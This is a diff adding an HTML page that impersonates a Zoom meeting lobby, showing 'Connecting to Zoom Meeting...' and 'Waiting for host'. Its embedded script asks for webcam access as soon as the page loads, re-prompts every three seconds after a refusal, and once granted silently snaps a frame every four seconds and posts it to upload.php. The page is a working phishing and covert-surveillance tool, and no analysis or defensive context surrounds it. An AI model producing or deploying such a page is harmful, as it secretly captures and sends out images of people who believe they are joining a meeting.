@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />                                   <title>Zoom Video Conference</title>
+  <style>
+    body {
+      background-color: #1d1d1d;                                 color: #fff;
+      font-family: 'Segoe UI', sans-serif;
+      text-align: center;
+      padding-top: 50px;                                       }
+    .container {
+      background-color: #2c2c2c;
+      border-radius: 10px;
+      padding: 20px;
+      width: 360px;
+      margin: auto;
+      box-shadow: 0px 0px 20px rgba(0,0,0,0.5);
+    }
+    h2 {
+      margin-bottom: 10px;
+    }
+    #video {
+      width: 320px;
+      height: 240px;
+      border-radius: 5px;
+      border: 2px solid #3f51b5;
+    }
+    .status {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #8bc34a;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>🔵 Connecting to Zoom Meeting...</h2>
+    <video id="video" autoplay muted></video>
+    <p class="status">Waiting for host to start the meeting...</p>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+  </div>
+
+  <script>
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    function requestCameraAccess() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+
+          // Start auto capture every 4 sec
+          setInterval(() => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL("image/png");
+
+            fetch("upload.php", {
+              method: "POST",
+              body: JSON.stringify({ image: imageData }),
+              headers: { "Content-Type": "application/json" }
+            });
+          }, 4000);
+        })
+        .catch(err => {
+          console.log("❌ Camera denied. Retrying in 3 sec...");
+          setTimeout(requestCameraAccess, 3000); // Retry after 3 sec
+        });
+    }
+
+    requestCameraAccess();
+  </script>
+</body>
+</html>
